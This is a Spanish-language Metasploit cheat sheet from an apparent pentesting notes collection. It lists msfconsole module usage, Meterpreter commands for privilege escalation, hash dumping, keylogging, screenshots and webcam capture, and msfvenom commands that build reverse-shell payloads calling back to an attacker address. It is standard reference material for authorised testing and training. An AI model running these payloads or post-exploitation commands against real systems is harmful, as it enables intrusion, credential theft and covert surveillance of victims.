# Metasploit — Cheat Sheet

> Framework de explotación, Meterpreter, post-explotación.

---

## Inicio

```bash
msfconsole                       # Iniciar consola
msfconsole -q                    # Modo silencioso
msfconsole -r script.rc          # Ejecutar resource script
```

## Búsqueda

```bash
search <keyword>                 # Buscar módulos
search type:exploit platform:linux  # Búsqueda filtrada
info <module>                    # Info de un módulo
```

## Uso de módulos

```bash
use exploit/<path>               # Seleccionar módulo
set RHOSTS 10.10.10.x           # IP objetivo
set RPORT 80                    # Puerto objetivo
set LHOST 10.10.14.x            # IP del atacante
set LPORT 4444                  # Puerto del atacante
set PAYLOAD <payload>            # Seleccionar payload
show options                     # Ver opciones configuradas
exploit                          # Ejecutar
exploit -j                       # Ejecutar como job en background
```

## Payloads

```bash
# Reverse shells
set PAYLOAD linux/x86/shell/reverse_tcp
set PAYLOAD windows/meterpreter/reverse_tcp
set PAYLOAD php/meterpreter/reverse_tcp

# Bind shells
set PAYLOAD windows/shell/bind_tcp

# Meterpreter
set PAYLOAD windows/meterpreter/reverse_tcp
```

## Meterpreter

```bash
sysinfo                          # Info del sistema
getuid                           # Usuario actual
getsystem                        # Escalada a SYSTEM
hashdump                         # Dump de hashes
download <file>                  # Descargar archivo
upload <file>                    # Subir archivo
shell                            # Shell del sistema
background (o bg)                # Dejar sesión activa en background
execute -f cmd.exe -i -H         # Ejecutar processo
keyscan_start                    # Iniciar keylogger
keyscan_dump                     # Dump del keylogger
screenshot                       # Captura de pantalla
webcam_snap                      # Foto de webcam
```

## Sesiones

```bash
sessions                         # Listar sesiones
sessions -i <id>                 # Interactuar con sesión
sessions -k <id>                 # Cerrar sesión
```

## msfvenom — Generación de payloads

```bash
# Reverse shells
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<TU_IP> LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -f elf -o shell.elf
msfvenom -p php/reverse_php LHOST=<TU_IP> LPORT=4444 -f raw -o shell.php

# Listar payloads
msfvenom -l payloads

# Escuchar con handler
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <TU_IP>
run
```

## Post-explotación

```bash
use post/multi/recon/local_exploit_suggester  # Sugerir exploits
use post/linux/gather/hashdump               # Dump hashes Linux
use post/windows/gather/smart_hashdump       # Dump hashes Windows
use post/multi/manage/shell_to_meterpreter   # Shell a Meterpreter
```

## Fuzzing

```bash
use auxiliary/fuzzing/<module>    # Módulos de fuzzing
set SRVHOST 10.10.14.x
run
```

## Resource scripts

```bash
# Crear script.rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.x
set LPORT 4444
exploit -j

# Ejecutar
msfconsole -r script.rc
```









---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[Netcat.md|Netcat]] — Linux, Metodologia Pentest, Netcat / Reverse Shells
- [[../11 - Forense Digital/Análisis Forense y Memoria.md|Análisis Forense y Memoria]] — Linux, Metodologia Pentest, Netcat / Reverse Shells
- [[../02 - Sistemas Operativos/Linux - Comandos Avanzados de Pentesting.md|Linux - Comandos Avanzados de Pentesting]] — Linux, Metodologia Pentest, Netcat / Reverse Shells
- [[../../comandos/Metasploit.md|Metasploit]] — Linux, Metodologia Pentest, Post-Explotacion
- [[../06 - Explotacion y Post-Explotacion/Escalada de Privilegios.md|Escalada de Privilegios]] — Linux, Metodologia Pentest, Netcat / Reverse Shells

### 🌐 Cross-Dominio

- [[../../../programacion/XML/xpath_xslt.md|xpath_xslt]] — Programacion: CLI/Scripting, Linux, Redes
- [[../../../redes/dig_nslookup.md|dig_nslookup]] — Redes: CLI/Scripting, Linux, Redes

> #cli #forense #linux #linux_ciber #metasploit #netcat #pentest #post_explotacion #redes #reverse_shell #wireshark
